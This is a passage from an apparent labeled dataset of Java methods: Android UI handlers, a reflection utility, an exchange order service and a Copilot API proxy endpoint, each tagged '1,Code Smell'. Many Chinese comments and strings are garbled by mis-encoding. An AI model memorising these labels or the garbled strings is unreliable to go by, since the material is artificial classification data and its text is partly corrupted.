        updateRows(true);
      }
    }
  }
}",1,Code Smell
"@Override public View createView(Context context){
  actionBar.setBackButtonImage(R.drawable.ic_ab_back);
  actionBar.setAllowOverlayTitle(true);
  actionBar.setTitle(LocaleController.getString(""PowerUsage"",R.string.PowerUsage));
  actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
    @Override public void onItemClick(    int id){
      if (id == -1) {
        finishFragment();
      }
    }
  }
);
  contentView=new FrameLayout(context);
  contentView.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundGray));
  listView=new RecyclerListView(context);
  listView.setLayoutManager(layoutManager=new LinearLayoutManager(context));
  listView.setAdapter(adapter=new Adapter());
  DefaultItemAnimator itemAnimator=new DefaultItemAnimator();
  itemAnimator.setDurations(350);
  itemAnimator.setInterpolator(CubicBezierInterpolator.EASE_OUT_QUINT);
  itemAnimator.setDelayAnimations(false);
  itemAnimator.setSupportsChangeAnimations(false);
  listView.setItemAnimator(itemAnimator);
  contentView.addView(listView,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT));
  listView.setOnItemClickListener((view,position,x,y) -> {
    if (view == null || position < 0 || position >= items.size()) {
      return;
    }
    final Item item=items.get(position);
    if (item.viewType == VIEW_TYPE_SWITCH || item.viewType == VIEW_TYPE_CHECKBOX) {
      if (LiteMode.isPowerSaverApplied()) {
        restrictBulletin=BulletinFactory.of(this).createSimpleBulletin(new BatteryDrawable(.1f,Color.WHITE,Theme.getColor(Theme.key_dialogSwipeRemove),1.3f),LocaleController.getString(""LiteBatteryRestricted"",R.string.LiteBatteryRestricted)).show();
        return;
      }
      if (item.viewType == VIEW_TYPE_SWITCH && item.getFlagsCount() > 1 && (LocaleController.isRTL ? x > dp(19 + 37 + 19) : x < view.getMeasuredWidth() - dp(19 + 37 + 19))) {
        int index=getExpandedIndex(item.flags);
        if (index != -1) {
          expanded[index]=!expanded[index];
          updateValues();
          updateItems();
          return;
        }
      }
      boolean value=LiteMode.isEnabledSetting(item.flags);
      LiteMode.toggleFlag(item.flags,!value);
      updateValues();
    }
 else     if (item.viewType == VIEW_TYPE_SWITCH2) {
      if (item.type == SWITCH_TYPE_SMOOTH_TRANSITIONS) {
        SharedPreferences preferences=MessagesController.getGlobalMainSettings();
        boolean animations=preferences.getBoolean(""view_animations"",true);
        SharedPreferences.Editor editor=preferences.edit();
        editor.putBoolean(""view_animations"",!animations);
        SharedConfig.setAnimationsEnabled(!animations);
        editor.commit();
        ((TextCell)view).setChecked(!animations);
      }
    }
  }
);
  fragmentView=contentView;
  FLAGS_CHAT=AndroidUtilities.isTablet() ? (LiteMode.FLAGS_CHAT & ~LiteMode.FLAG_CHAT_FORUM_TWOCOLUMN) : LiteMode.FLAGS_CHAT;
  updateItems();
  return fragmentView;
}",1,Code Smell
"@Override protected DragView startDrag(@Nullable Drawable drawable,@Nullable View view,DraggableView originalView,int dragLayerX,int dragLayerY,DragSource source,ItemInfo dragInfo,Rect dragRegion,float initialDragViewScale,float dragViewScaleOnDrop,DragOptions options){
  if (PROFILE_DRAWING_DURING_DRAG) {
    android.os.Debug.startMethodTracing(""Launcher"");
  }
  mActivity.hideKeyboard();
  mOptions=options;
  if (mOptions.simulatedDndStartPoint != null) {
    mLastTouch.x=mMotionDown.x=mOptions.simulatedDndStartPoint.x;
    mLastTouch.y=mMotionDown.y=mOptions.simulatedDndStartPoint.y;
  }
  final int registrationX=mMotionDown.x - dragLayerX;
  final int registrationY=mMotionDown.y - dragLayerY;
  final int dragRegionLeft=dragRegion == null ? 0 : dragRegion.left;
  final int dragRegionTop=dragRegion == null ? 0 : dragRegion.top;
  mLastDropTarget=null;
  mDragObject=new DropTarget.DragObject(mActivity.getApplicationContext());
  mDragObject.originalView=originalView;
  mIsInPreDrag=mOptions.preDragCondition != null && !mOptions.preDragCondition.shouldStartDrag(0);
  final Resources res=mActivity.getResources();
  final float scaleDps=mIsInPreDrag ? res.getDimensionPixelSize(R.dimen.pre_drag_view_scale) : 0f;
  final DragView dragView=mDragObject.dragView=drawable != null ? new SecondaryDragView(mActivity,drawable,registrationX,registrationY,initialDragViewScale,dragViewScaleOnDrop,scaleDps) : new SecondaryDragView(mActivity,view,view.getMeasuredWidth(),view.getMeasuredHeight(),registrationX,registrationY,initialDragViewScale,dragViewScaleOnDrop,scaleDps);
  dragView.setItemInfo(dragInfo);
  mDragObject.dragComplete=false;
  mDragObject.xOffset=mMotionDown.x - (dragLayerX + dragRegionLeft);
  mDragObject.yOffset=mMotionDown.y - (dragLayerY + dragRegionTop);
  mDragDriver=DragDriver.create(this,mOptions,ev -> {
  }
);
  if (!mOptions.isAccessibleDrag) {
    mDragObject.stateAnnouncer=DragViewStateAnnouncer.createFor(dragView);
  }
  mDragObject.dragSource=source;
  mDragObject.dragInfo=dragInfo;
  mDragObject.originalDragInfo=mDragObject.dragInfo.makeShallowCopy();
  if (mOptions.preDragCondition != null) {
    dragView.setHasDragOffset(mOptions.preDragCondition.getDragOffset().x != 0 || mOptions.preDragCondition.getDragOffset().y != 0);
  }
  if (dragRegion != null) {
    dragView.setDragRegion(new Rect(dragRegion));
  }
  mActivity.getDragLayer().performHapticFeedback(HapticFeedbackConstants.LONG_PRESS);
  dragView.show(mLastTouch.x,mLastTouch.y);
  mDistanceSinceScroll=0;
  if (!mIsInPreDrag) {
    callOnDragStart();
  }
 else   if (mOptions.preDragCondition != null) {
    mOptions.preDragCondition.onPreDragStart(mDragObject);
  }
  handleMoveEvent(mLastTouch.x,mLastTouch.y);
  return dragView;
}",1,Code Smell
"/** 
 * DO NOT USE, it's fragile instance methods are counted, both public/private, static methods are EXCLUDED, count from 0
 * @param obj
 * @param ordinal                the ordinal of instance method meeting the signature
 * @param expected               how many instance methods are expected there
 * @param argsTypesAndReturnType
 * @return
 * @throws NoSuchMethodException
 * @throws InvocationTargetException
 * @throws IllegalAccessException
 * @throws IllegalArgumentException
 */
@Deprecated public static Object invokeVirtualDeclaredOrdinalModifier(Object obj,int ordinal,int expected,boolean strict,int requiredMask,int excludedMask,Object... argsTypesAndReturnType) throws NoSuchMethodException, InvocationTargetException, IllegalArgumentException {
  Class clazz=obj.getClass();
  int argc=argsTypesAndReturnType.length / 2;
  Class[] argt=new Class[argc];
  Object[] argv=new Object[argc];
  Class returnType=null;
  if (argc * 2 + 1 == argsTypesAndReturnType.length) {
    returnType=(Class)argsTypesAndReturnType[argsTypesAndReturnType.length - 1];
  }
  int i, ii;
  Method[] m;
  Method[] candidates=new Method[expected];
  int count=0;
  Class[] _argt;
  for (i=0; i < argc; i++) {
    argt[i]=(Class)argsTypesAndReturnType[argc + i];
    argv[i]=argsTypesAndReturnType[i];
  }
  m=clazz.getDeclaredMethods();
  loop:   for (i=0; i < m.length; i++) {
    _argt=m[i].getParameterTypes();
    if (_argt.length == argt.length) {
      for (ii=0; ii < argt.length; ii++) {
        if (!argt[ii].equals(_argt[ii])) {
          continue loop;
        }
      }
      if (returnType != null && !returnType.equals(m[i].getReturnType())) {
        continue;
      }
      if (Modifier.isStatic(m[i].getModifiers())) {
        continue;
      }
      if ((m[i].getModifiers() & requiredMask) != requiredMask) {
        continue;
      }
      if ((m[i].getModifiers() & excludedMask) != 0) {
        continue;
      }
      if (count < expected) {
        candidates[count++]=m[i];
      }
 else {
        if (!strict) {
          break;
        }
        throw new NoSuchMethodException(""More methods than expected("" + expected + "") at ""+ paramsTypesToString(argt)+ "" in ""+ obj.getClass().getName());
      }
    }
  }
  if (strict && count != expected) {
    throw new NoSuchMethodException(""Less methods("" + count + "") than expected(""+ expected+ "") at ""+ paramsTypesToString(argt)+ "" in ""+ obj.getClass().getName());
  }
  Arrays.sort(candidates,(o1,o2) -> {
    if (o1 == null && o2 == null) {
      return 0;
    }
    if (o1 == null) {
      return 1;
    }
    if (o2 == null) {
      return -1;
    }
    return strcmp(o1.getName(),o2.getName());
  }
);
  candidates[ordinal].setAccessible(true);
  try {
    return candidates[ordinal].invoke(obj,argv);
  }
 catch (  IllegalAccessException e) {
    throw new AssertionError(e);
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public RespModel<Integer> runSuite(int suiteId,String strike){
  TestSuitesDTO testSuitesDTO=findById(suiteId);
  if (testSuitesDTO == null) {
    return new RespModel<>(3001,""suite.deleted"");
  }
  if (testSuitesDTO.getTestCases().size() == 0) {
    return new RespModel<>(3002,""suite.empty.cases"");
  }
  List<Devices> devicesList=testSuitesDTO.getDevices().stream().map(DevicesDTO::convertTo).collect(Collectors.toList());
  for (int i=devicesList.size() - 1; i >= 0; i--) {
    if (devicesList.get(i).getStatus().equals(DeviceStatus.OFFLINE) || devicesList.get(i).getStatus().equals(DeviceStatus.DISCONNECTED)) {
      devicesList.remove(devicesList.get(i));
    }
  }
  if (devicesList.size() == 0) {
    return new RespModel<>(3003,""suite.not.free.device"");
  }
  Results results=new Results();
  results.setStatus(ResultStatus.RUNNING);
  results.setSuiteId(suiteId);
  results.setSuiteName(testSuitesDTO.getName());
  results.setStrike(strike);
  if (testSuitesDTO.getCover() == CoverType.CASE) {
    results.setSendMsgCount(testSuitesDTO.getTestCases().size());
  }
  if (testSuitesDTO.getCover() == CoverType.DEVICE) {
    results.setSendMsgCount(testSuitesDTO.getTestCases().size() * devicesList.size());
  }
  results.setReceiveMsgCount(0);
  results.setProjectId(testSuitesDTO.getProjectId());
  resultsService.save(results);
  List<GlobalParams> globalParamsList=globalParamsService.findAll(testSuitesDTO.getProjectId());
  Map<String,List<String>> valueMap=new HashMap<>();
  JSONObject gp=new JSONObject();
  for (  GlobalParams g : globalParamsList) {
    if (g.getParamsValue().contains(""|"")) {
      List<String> shuffle=new ArrayList<>(Arrays.asList(g.getParamsValue().split(""\\|"")));
      Collections.shuffle(shuffle);
      valueMap.put(g.getParamsKey(),shuffle);
    }
 else {
      gp.put(g.getParamsKey(),g.getParamsValue());
    }
  }
  coverHandlerMap.get(testSuitesDTO.getCover()).handlerSuite(testSuitesDTO,gp,devicesList,valueMap,results);
  return new RespModel<>(RespEnum.HANDLE_OK,results.getId());
}",1,Code Smell
"@PostMapping(value=""/cocopilot/v1/embeddings"") public Object coCoPilotEmbeddings(HttpServletResponse response,HttpServletRequest request,@org.springframework.web.bind.annotation.RequestBody Object conversation){
  return CompletableFuture.supplyAsync(() -> {
    try {
      if (conversation == null) {
        return new ResponseEntity<>(""Request body is missing or not in JSON format"",HttpStatus.BAD_REQUEST);
      }
      String authorizationHeader=StringUtils.trimToNull(request.getHeader(""Authorization""));
      String apiKey;
      if (authorizationHeader != null && authorizationHeader.startsWith(""Bearer "")) {
        apiKey=authorizationHeader.substring(7);
      }
 else {
        return new ResponseEntity<>(""Authorization header is missing"",HttpStatus.UNAUTHORIZED);
      }
      if (!coCopilotTokenList.containsKey(apiKey)) {
        String token=getCoCoToken(apiKey);
        if (token == null) {
          return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
        }
        coCopilotTokenList.put(apiKey,token);
        log.info(""coCopilotTokenList鍒濆鍖栨垚鍔燂紒"");
      }
      String chat_token=coCopilotTokenList.get(apiKey);
      Map<String,String> headersMap=new HashMap<>();
      addHeader(headersMap,chat_token);
      String json=com.alibaba.fastjson2.JSON.toJSONString(conversation);
      MediaType JSON=MediaType.get(""application/json; charset=utf-8"");
      RequestBody requestBody=RequestBody.create(json,JSON);
      Request.Builder requestBuilder=new Request.Builder().url(""https://api.githubcopilot.com/embeddings"").post(requestBody);
      headersMap.forEach(requestBuilder::addHeader);
      Request streamRequest=requestBuilder.build();
      try (Response resp=client.newCall(streamRequest).execute()){
        if (!resp.isSuccessful()) {
          if (resp.code() == 429) {
            return new ResponseEntity<>(""rate limit exceeded"",HttpStatus.TOO_MANY_REQUESTS);
          }
 else {
            String token=getCoCoToken(apiKey);
            if (token == null) {
              return new ResponseEntity<>(""copilot APIKey is wrong"",HttpStatus.UNAUTHORIZED);
            }
            coCopilotTokenList.put(apiKey,token);
            log.info(""token杩囨湡锛宑oCopilotTokenList閲嶇疆鍖栨垚鍔燂紒"");
            againEmbeddings(response,conversation,token);
          }
        }
 else {
          outPutEmbeddings(response,resp);
          com.alibaba.fastjson2.JSONObject jsonObject=com.alibaba.fastjson2.JSON.parseObject(json);
          String model=jsonObject.getString(""model"");
          if (modelsUsage.containsKey(model)) {
            modelsUsage.put(model,modelsUsage.get(model) + 1);
          }
 else {
            modelsUsage.put(model,1);
          }
        }
      }
       return null;
    }
 catch (    IOException e) {
      throw new RuntimeException(e);
    }
  }
,executor).orTimeout(6,TimeUnit.MINUTES).exceptionally(ex -> {
    if (ex instanceof TimeoutException) {
      return new ResponseEntity<>(""Request timed out"",HttpStatus.REQUEST_TIMEOUT);
    }
 else {
      return new ResponseEntity<>(""An error occurred"",HttpStatus.INTERNAL_SERVER_ERROR);
    }
  }
);
}",1,Code Smell
"/** 
 * 娣诲姞濮旀墭璁㈠崟
 * @param memberId
 * @param order
 * @return
 */
@Transactional public MessageResult addOrder(Long memberId,ExchangeOrder order){
  order.setTime(Calendar.getInstance().getTimeInMillis());
  order.setStatus(ExchangeOrderStatus.TRADING);
  order.setTradedAmount(BigDecimal.ZERO);
  order.setOrderId(GeneratorUtil.getOrderId(""E""));
  log.info(""add order:{}"",order);
  if (order.getDirection() == ExchangeOrderDirection.BUY) {
    MemberWallet wallet=memberWalletService.findByCoinUnitAndMemberId(order.getBaseSymbol(),memberId);
    if (wallet.getIsLock().equals(BooleanEnum.IS_TRUE)) {
      return MessageResult.error(""閽卞寘宸查攣瀹"");
    }
    BigDecimal turnover;
    if (order.getType() == ExchangeOrderType.MARKET_PRICE) {
      turnover=order.getAmount();
    }
 else {
      turnover=order.getAmount().multiply(order.getPrice());
    }
    if (wallet.getBalance().compareTo(turnover) < 0) {
      return MessageResult.error(500,"""" + """" + order.getBaseSymbol());
    }
 else {
      MessageResult result=memberWalletService.freezeBalance(wallet,turnover);
      if (result.getCode() != 0) {
        return MessageResult.error(500,msService.getMessage(""INSUFFICIENT_COIN"") + order.getBaseSymbol());
      }
    }
  }
 else   if (order.getDirection() == ExchangeOrderDirection.SELL) {
    MemberWallet wallet=memberWalletService.findByCoinUnitAndMemberId(order.getCoinSymbol(),memberId);
    if (wallet.getIsLock().equals(BooleanEnum.IS_TRUE)) {
      return MessageResult.error(""閽卞寘宸查攣瀹"");
    }
    if (wallet.getBalance().compareTo(order.getAmount()) < 0) {
      return MessageResult.error(500,msService.getMessage(""INSUFFICIENT_COIN"") + order.getCoinSymbol());
    }
 else {
      MessageResult result=memberWalletService.freezeBalance(wallet,order.getAmount());
      if (result.getCode() != 0) {
        return MessageResult.error(500,msService.getMessage(""INSUFFICIENT_COIN"") + order.getCoinSymbol());
      }
    }
  }
  order=exchangeOrderRepository.saveAndFlush(order);
  if (order != null) {
    return MessageResult.success(""success"");
  }
 else {
    return MessageResult.error(500,""error"");
  }
}",1,Code Smell
"public void selectReaction(MessageObject primaryMessage,ReactionsContainerLayout reactionsLayout,View fromView,float x,float y,ReactionsLayoutInBubble.VisibleReaction visibleReaction,boolean fromDoubleTap,boolean bigEmoji,boolean addToRecent){
  if (isInScheduleMode() || primaryMessage == null) {
    return;
  }
  ReactionsEffectOverlay.removeCurrent(false);
  boolean added=primaryMessage.selectReaction(visibleReaction,bigEmoji,fromDoubleTap);
  int messageIdForCell=primaryMessage.getId();
  if (groupedMessagesMap.get(primaryMessage.getGroupId()) != null) {
    int flags=primaryMessage.shouldDrawReactionsInLayout() ? MessageObject.POSITION_FLAG_BOTTOM | MessageObject.POSITION_FLAG_LEFT : MessageObject.POSITION_FLAG_BOTTOM | MessageObject.POSITION_FLAG_RIGHT;
    MessageObject messageObject=groupedMessagesMap.get(primaryMessage.getGroupId()).findMessageWithFlags(flags);
    if (messageObject != null) {
      messageIdForCell=messageObject.getId();
    }
  }
  int finalMessageIdForCell=messageIdForCell;
  if (added && !fromDoubleTap) {
    ChatMessageCell cell=findMessageCell(finalMessageIdForCell,true);
    ReactionsEffectOverlay.show(ChatActivity.this,reactionsLayout,cell,fromView,x,y,visibleReaction,currentAccount,reactionsLayout != null ? (bigEmoji ? ReactionsEffectOverlay.LONG_ANIMATION : ReactionsEffectOverlay.ONLY_MOVE_ANIMATION) : ReactionsEffectOverlay.SHORT_ANIMATION);
  }
  if (added) {
    if (visibleReaction.emojicon != null) {
      AndroidUtilities.makeAccessibilityAnnouncement(LocaleController.formatString(""AccDescrYouReactedWith"",R.string.AccDescrYouReactedWith,visibleReaction.emojicon));
    }
  }
  ArrayList<ReactionsLayoutInBubble.VisibleReaction> visibleReactions=new ArrayList<>();
  visibleReactions.addAll(primaryMessage.getChoosenReactions());
  getSendMessagesHelper().sendReaction(primaryMessage,visibleReactions,added ? visibleReaction : null,bigEmoji,addToRecent,ChatActivity.this,updateReactionRunnable=new Runnable(){
    @Override public void run(){
      if (updateReactionRunnable != null) {
        updateReactionRunnable=null;
        if (fromDoubleTap) {
          doOnIdle(() -> {
            AndroidUtilities.runOnUIThread(() -> {
              ChatMessageCell cell=findMessageCell(finalMessageIdForCell,true);
              if (added) {
                ReactionsEffectOverlay.show(ChatActivity.this,reactionsLayout,cell,null,x,y,visibleReaction,currentAccount,ReactionsEffectOverlay.SHORT_ANIMATION);
                ReactionsEffectOverlay.startAnimation();
              }
            }
,50);
          }
);
        }
 else {
          doOnIdle(() -> {
            MessageObject messageToUpdate=primaryMessage;
            MessageObject messageInDict=messagesDict[0].get(primaryMessage.getId());
            if (messageInDict != null && messageInDict != primaryMessage) {
              messageToUpdate=messagesDict[0].get(primaryMessage.getId());
              messageToUpdate.messageOwner.reactions=primaryMessage.messageOwner.reactions;
            }
            updateMessageAnimated(messageToUpdate,true);
            ReactionsEffectOverlay.startAnimation();
          }
);
        }
        closeMenu();
      }
    }
  }
);
  if (fromDoubleTap) {
    updateMessageAnimated(primaryMessage,true);
    updateReactionRunnable.run();
  }
  AndroidUtilities.runOnUIThread(updateReactionRunnable,50);
}",1,Code Smell
"public void removeUselessWatchDirectories(String curDataTime) throws Exception {
  logger.info(""removeUselessWatchDirectories {}"",curDataTime);
  long curDataTimeMillis=DateTransUtils.timeStrConvertToMillSec(curDataTime,cycleUnit);
  Calendar calendar=Calendar.getInstance();
  calendar.setTimeInMillis(curDataTimeMillis);
  if (""D"".equalsIgnoreCase(cycleUnit)) {
    calendar.add(Calendar.DAY_OF_YEAR,-3);
  }
 else   if (""h"".equalsIgnoreCase(cycleUnit)) {
    calendar.add(Calendar.HOUR_OF_DAY,-3);
  }
 else   if (""10m"".equalsIgnoreCase(cycleUnit)) {
    calendar.add(Calendar.MINUTE,-30);
  }
  String year=String.valueOf(calendar.get(Calendar.YEAR));
  String month=String.valueOf(calendar.get(Calendar.MONTH) + 1);
  if (month.length() < 2) {
    month=""0"" + month;
  }
  String day=String.valueOf(calendar.get(Calendar.DAY_OF_MONTH));
  if (day.length() < 2) {
    day=""0"" + day;
  }
  String hour=String.valueOf(calendar.get(Calendar.HOUR_OF_DAY));
  if (hour.length() < 2) {
    hour=""0"" + hour;
  }
  String minute=String.valueOf(calendar.get(Calendar.MINUTE));
  if (minute.length() < 2) {
    minute=""0"" + minute;
  }
  String copyDirPattern=new String(originPatternWithoutFileName);
  copyDirPattern=copyDirPattern.replace(""YYYY"",year);
  copyDirPattern=copyDirPattern.replace(""MM"",month);
  copyDirPattern=copyDirPattern.replace(""DD"",day);
  copyDirPattern=copyDirPattern.replace(""hh"",hour);
  copyDirPattern=copyDirPattern.replace(""mm"",minute);
  Set<String> keys=pathToKeys.keySet();
  Set<String> tmpKeys=new HashSet<>();
  tmpKeys.addAll(keys);
  String rootDir=Paths.get(basicStaticPath).toAbsolutePath().toString();
  for (  String path : tmpKeys) {
    logger.info(""[Path]{}  {}"",path,copyDirPattern);
    if (path.compareTo(copyDirPattern) < 0 && !copyDirPattern.contains(path)) {
      WatchKey key=pathToKeys.get(path);
      key.cancel();
      pathToKeys.remove(path);
      logger.info(""Watch path: {} is too old for data time: {}, we should remove"",path,curDataTime);
    }
  }
}",1,Code Smell
"void startRangeDownload(LongList gidList){
  boolean update=false;
  boolean downloadOrder=Settings.getDownloadOrder();
  if (downloadOrder) {
    for (int i=0, n=gidList.size(); i < n; i++) {
      long gid=gidList.get(i);
      DownloadInfo info=mAllInfoMap.get(gid);
      if (null == info) {
        Log.d(TAG,""Can't get download info with gid: "" + gid);
        continue;
      }
      if (info.state == DownloadInfo.STATE_NONE || info.state == DownloadInfo.STATE_FAILED || info.state == DownloadInfo.STATE_FINISH) {
        update=true;
        info.state=DownloadInfo.STATE_WAIT;
        mWaitList.add(info);
        EhDB.putDownloadInfo(info);
      }
    }
  }
 else {
    for (int i=gidList.size(), n=0; i > n; i--) {
      long gid=gidList.get(i - 1);
      DownloadInfo info=mAllInfoMap.get(gid);
      if (null == info) {
        Log.d(TAG,""Can't get download info with gid: "" + gid);
        continue;
      }
      if (info.state == DownloadInfo.STATE_NONE || info.state == DownloadInfo.STATE_FAILED || info.state == DownloadInfo.STATE_FINISH) {
        update=true;
        info.state=DownloadInfo.STATE_WAIT;
        mWaitList.add(info);
        EhDB.putDownloadInfo(info);
      }
    }
  }
  if (update) {
    for (    DownloadInfoListener l : mDownloadInfoListeners) {
      l.onUpdateAll();
    }
    ensureDownload();
  }
}",1,Code Smell
"/** 
 * 鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚鏃讹紝妫�鏌ユ枃浠朵俊鎭浉鍏冲弬鏁帮紝濡傛灉缂哄皯鍒欐姏鍑哄紓甯�
 * @param fileInfo 鏂囦欢淇℃伅
 */
public static void completeMultipartUpload(FileInfo fileInfo){
  if (fileInfo == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃浼犲叆 fileInfo 鍙傛暟"");
  if (fileInfo.getPlatform() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� platform 鍙傛暟"");
  if (fileInfo.getBasePath() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� basePath 鍙傛暟"");
  if (fileInfo.getPath() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� path 鍙傛暟"");
  if (fileInfo.getFilename() == null)   throw new FileStorageRuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� filename 鍙傛暟"");
  if (fileInfo.getId() == null && fileInfo.getUrl() == null)   throw new RuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� id 鎴� url 鍙傛暟"");
  if (fileInfo.getUploadId() == null)   throw new RuntimeException(""鎵嬪姩鍒嗙墖涓婁紶-瀹屾垚澶辫触锛岃鍦� FileInfo 涓紶鍏� uploadId 鍙傛暟"");
}
",1,Code Smell
"public void _Theme_UI(){
  if (THEME.getString(""THEME"","""").equals(""14"")) {
    main_body.setBackgroundColor(0xFF1B5E20);
  }
 else {
    if (THEME.getString(""THEME"","""").equals(""15"")) {
      main_body.setBackgroundColor(0xFF00008B);
    }
 else {
      if (THEME.getString(""THEME"","""").equals(""16"")) {
        main_body.setBackgroundColor(0xFF8B0000);
      }
 else {
        if (THEME.getString(""THEME"","""").equals(""17"")) {
          main_body.setBackgroundColor(0xFFFF8C00);
        }
 else {
          if (THEME.getString(""THEME"","""").equals(""18"")) {
            main_body.setBackgroundColor(0xFFAA336A);
          }
 else {
            if (THEME.getString(""THEME"","""").equals(""19"")) {
              main_body.setBackgroundColor(0xFF301934);
            }
 else {
              if (THEME.getString(""THEME"","""").equals(""20"")) {
                main_body.setBackgroundColor(0xFF008B8B);
              }
 else {
                main_body.setBackgroundColor(0xFF171717);
              }
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"public Object intercept(Invocation invocation) throws Throwable {
  if (TransactionSynchronizationManager.isActualTransactionActive()) {
    return invocation.proceed();
  }
  Object target=invocation.getTarget();
  Object[] args=invocation.getArgs();
  if (target instanceof Executor) {
    MappedStatement mappedStatement=((MappedStatement)args[0]);
    SqlCommandType sqlCommandType=mappedStatement.getSqlCommandType();
    if (sqlCommandType != SqlCommandType.SELECT || !matchTenantAnnotation(mappedStatement)) {
      return invocation.proceed();
    }
    Executor executor=(Executor)target;
    Object parameter=args[1];
    RowBounds rowBounds=(RowBounds)args[2];
    ResultHandler resultHandler=(ResultHandler)args[3];
    BoundSql boundSql;
    if (args.length == 4) {
      boundSql=mappedStatement.getBoundSql(parameter);
    }
 else {
      boundSql=(BoundSql)args[5];
    }
    Statement statement=CCJSqlParserUtil.parse(boundSql.getSql());
    Select select=(Select)statement;
    SelectBody selectBody=select.getSelectBody();
    selectBody.accept(midSelectVisitorAdapter);
    MetaObject metaObject=SystemMetaObject.forObject(boundSql);
    metaObject.setValue(""sql"",select.toString());
    CacheKey cacheKey=executor.createCacheKey(mappedStatement,parameter,rowBounds,boundSql);
    return executor.query(mappedStatement,parameter,rowBounds,resultHandler,cacheKey,boundSql);
  }
  if (target instanceof StatementHandler) {
    StatementHandler statementHandler=(StatementHandler)target;
    BoundSql boundSql=statementHandler.getBoundSql();
    Statement statement=CCJSqlParserUtil.parse(boundSql.getSql());
    MappedStatement mappedStatement=getMappedStatement(statementHandler);
    if (mappedStatement.getSqlCommandType() != SqlCommandType.UPDATE || !matchTenantAnnotation(mappedStatement)) {
      return invocation.proceed();
    }
    if (statement instanceof Update) {
      Update update=(Update)statement;
      update.setWhere(DBExpressionUtils.appendMidExpression(update.getWhere()));
      MetaObject metaObject=SystemMetaObject.forObject(boundSql);
      metaObject.setValue(""sql"",update.toString());
    }
  }
  return invocation.proceed();
}",1,Code Smell
"/** 
 * Core method of the CLI handler.
 */
protected static void main(){
  Prompts.alphaDisclaimer();
  System.out.print(""\n"");
  Prompts.welcome();
  boolean goAgane=true;
  boolean repeat=false;
  while (goAgane) {
    if (repeat) {
      Prompts.clearConsole();
      Prompts.repeatWelcome();
    }
    int mOption=Prompts.menu();
    boolean agane=true;
    oType op;
    vType vt;
    while (agane) {
      if (mOption <= 2) {
        StreamHandler sh=new StreamHandler(mOption);
        vt=vType.Stream;
      }
 else       if (mOption <= 5) {
        VODHandler vh=new VODHandler(mOption);
        vt=vType.VOD;
      }
 else       if (mOption <= 8) {
        HighlightHandler hh=new HighlightHandler(mOption);
        vt=vType.Highlight;
      }
 else       if (mOption <= 12) {
        VideoHandler vh=new VideoHandler(mOption);
        vt=vType.Video;
      }
 else       if (mOption <= 15) {
        ClipHandler ch=new ClipHandler(mOption);
        vt=vType.Clip;
      }
 else {
        MassHandler mh=new MassHandler(mOption);
        vt=vType.Mass;
      }
      if (mOption == 1 || mOption == 3 || mOption == 6 || mOption == 13) {
        op=oType.Retrieve;
      }
 else       if (mOption == 2 || mOption == 4 || mOption == 7 || mOption == 11 || mOption == 14 || mOption == 17) {
        op=oType.Download;
      }
 else       if (mOption == 5 || mOption == 8 || mOption == 15 || mOption == 16) {
        op=oType.Recover;
      }
 else       if (mOption == 9) {
        op=oType.Check;
      }
 else       if (mOption == 10) {
        op=oType.Unmute;
      }
 else {
        op=oType.Convert;
      }
      agane=Prompts.repeat(vt,op);
    }
    goAgane=Prompts.goAgane();
  }
  sc.close();
  Prompts.exitMessage();
}",1,Code Smell
"/** 
 * Add a shortcut to the workspace or to a Folder.
 * @param data The intent describing the shortcut.
 */
protected void completeAddShortcut(Intent data,int container,int screenId,int cellX,int cellY,PendingRequestArgs args){
  if (args.getRequestCode() != REQUEST_CREATE_SHORTCUT) {
    return;
  }
  int[] cellXY=mTmpAddItemCellCoordinates;
  CellLayout layout=getCellLayout(container,screenId);
  WorkspaceItemInfo info=PinRequestHelper.createWorkspaceItemFromPinItemRequest(this,PinRequestHelper.getPinItemRequest(data),0);
  if (info == null) {
    Log.e(TAG,""Unable to parse a valid shortcut result"");
    return;
  }
  if (container < 0) {
    final View view=createShortcut(info);
    boolean foundCellSpan=false;
    if (cellX >= 0 && cellY >= 0) {
      cellXY[0]=cellX;
      cellXY[1]=cellY;
      foundCellSpan=true;
      DragObject dragObject=new DragObject(getApplicationContext());
      dragObject.dragInfo=info;
      if (mWorkspace.createUserFolderIfNecessary(view,container,layout,cellXY,0,true,dragObject)) {
        return;
      }
      if (mWorkspace.addToExistingFolderIfNecessary(view,layout,cellXY,0,dragObject,true)) {
        return;
      }
    }
 else {
      foundCellSpan=layout.findCellForSpan(cellXY,1,1);
    }
    if (!foundCellSpan) {
      mWorkspace.onNoCellFound(layout,info,null);
      return;
    }
    getModelWriter().addItemToDatabase(info,container,screenId,cellXY[0],cellXY[1]);
    mWorkspace.addInScreen(view,info);
  }
 else {
    FolderIcon folderIcon=findFolderIcon(container);
    if (folderIcon != null) {
      FolderInfo folderInfo=(FolderInfo)folderIcon.getTag();
      folderInfo.add(info,args.rank,false);
    }
 else {
      Log.e(TAG,""Could not find folder with id "" + container + "" to add shortcut."");
    }
  }
}",1,Code Smell
"@Override protected void onCreate(Bundle savedInstanceState){
  LayoutInflater inflater=LayoutInflater.from(getContext());
  if (mProgressStyle == STYLE_HORIZONTAL) {
    mViewUpdateHandler=new Handler(Looper.getMainLooper()){
      @Override public void handleMessage(      Message msg){
        super.handleMessage(msg);
        int progress=mProgress.getProgress();
        int max=mProgress.getMax();
        if (mProgressNumberFormat != null) {
          String format=mProgressNumberFormat;
          mProgressNumber.setText(String.format(format,progress,max));
        }
